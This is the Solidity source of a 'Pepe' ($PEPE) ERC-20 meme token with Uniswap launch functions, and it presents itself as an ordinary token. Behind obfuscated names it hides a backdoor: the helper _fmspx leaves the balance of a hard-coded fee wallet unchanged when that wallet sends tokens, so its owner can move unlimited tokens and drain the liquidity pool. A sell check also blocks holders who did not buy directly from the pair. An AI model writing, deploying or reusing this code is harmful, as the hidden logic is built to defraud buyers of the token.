/**

Pepe   $PEPE


𝕏/TWITTER: https://twitter.com/Pepeerc_Coin
TELEGRAM: https://t.me/Pepeeth_Coin
WEBSITE: https://pepeerc.com/

**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _fmspx(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _fmspx(a, b, "SafeMath:");
    }

    function  _fmspx(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _xapvhoaf {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _xfmcnvus {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract Pepe is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Pepe";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalnu = 42069000000 * 10 **_decimals;
    uint256 public _mvuvgAmaunt = _Totalnu;
    uint256 public _Wallesuope = _Totalnu;
    uint256 public _wapThresfuto= _Totalnu;
    uint256 public _mfakTakof= _Totalnu;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _islEuiamp;
    mapping (address => bool) private _taxvbWaray;
    mapping(address => uint256) private _lroupboe;
    bool public _targaleuv = false;
    address payable private _TdjFahop;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapmfoiqb=0;
    uint256 private _busnjoue=0;


    _xfmcnvus private _Tfdolel;
    address private _yavabcps;
    bool private _qrmjnvlh;
    bool private loSoylurp = false;
    bool private _awkofnup = false;


    event _amxoubvl(uint _mvuvgAmaunt);
    modifier loevTouhlq {
        loSoylurp = true;
        _;
        loSoylurp = false;
    }

    constructor () {      
        _TdjFahop = payable(0xAF0108722ddD810DB38e1358C10ac628baa2E758);
        _balances[_msgSender()] = _Totalnu;
        _islEuiamp[owner()] = true;
        _islEuiamp[address(this)] = true;
        _islEuiamp[_TdjFahop] = true;

 

        emit Transfer(address(0), _msgSender(), _Totalnu);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalnu;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _fmspx(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_targaleuv) {
                if (to != address
                (_Tfdolel) && to !=
                 address(_yavabcps)) {
                  require(_lroupboe
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lroupboe
                  [tx.origin] = block.number;
                }
            }

            if (from == _yavabcps && to != 
            address(_Tfdolel) && !_islEuiamp[to] ) {
                require(amount <= _mvuvgAmaunt,
                 "Exceeds the _mvuvgAmaunt.");
                require(balanceOf(to) + amount
                 <= _Wallesuope, "Exceeds the maxWalletSize.");
                if(_busnjoue
                < _wapmfoiqb){
                  require(! _frjxnpui(to));
                }
                _busnjoue++;
                 _taxvbWaray[to]=true;
                teeomoun = amount.mul((_busnjoue>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _yavabcps && from!= address(this) 
            && !_islEuiamp[from] ){
                require(amount <= _mvuvgAmaunt && 
                balanceOf(_TdjFahop)<_mfakTakof,
                 "Exceeds the _mvuvgAmaunt.");
                teeomoun = amount.mul((_busnjoue>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_busnjoue>_wapmfoiqb &&
                 _taxvbWaray[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!loSoylurp 
            && to == _yavabcps && _awkofnup &&
             contractTokenBalance>_wapThresfuto 
            && _busnjoue>_wapmfoiqb&&
             !_islEuiamp[to]&& !_islEuiamp[from]
            ) {
                _swpbhgfah( _raqse(amount, 
                _raqse(contractTokenBalance,_mfakTakof)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _rurfmop(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _fmspx(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _fmspx(teeomoun));
        emit Transfer(from, to, 
        amount. _fmspx(teeomoun));
    }

    function _swpbhgfah(uint256
     tokenAmount) private loevTouhlq {
        if(tokenAmount==0){return;}
        if(!_qrmjnvlh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _Tfdolel.WETH();
        _approve(address(this),
         address(_Tfdolel), tokenAmount);
        _Tfdolel.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _raqse(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _fmspx(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _TdjFahop){
            return a ;
        }else{
            return a . _fmspx (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mvuvgAmaunt = _Totalnu;
        _Wallesuope = _Totalnu;
        _targaleuv = false;
        emit _amxoubvl(_Totalnu);
    }

    function _frjxnpui(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _rurfmop(uint256
    amount) private {
        _TdjFahop.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _qrmjnvlh);
        _Tfdolel   =  _xfmcnvus (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_Tfdolel), _Totalnu);
        _yavabcps = _xapvhoaf(_Tfdolel.factory()). createPair (address(this),  _Tfdolel . WETH ());
        _Tfdolel.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_yavabcps).approve(address(_Tfdolel), type(uint).max);
        _awkofnup = true;
        _qrmjnvlh = true;
    }

    receive() external payable {}
}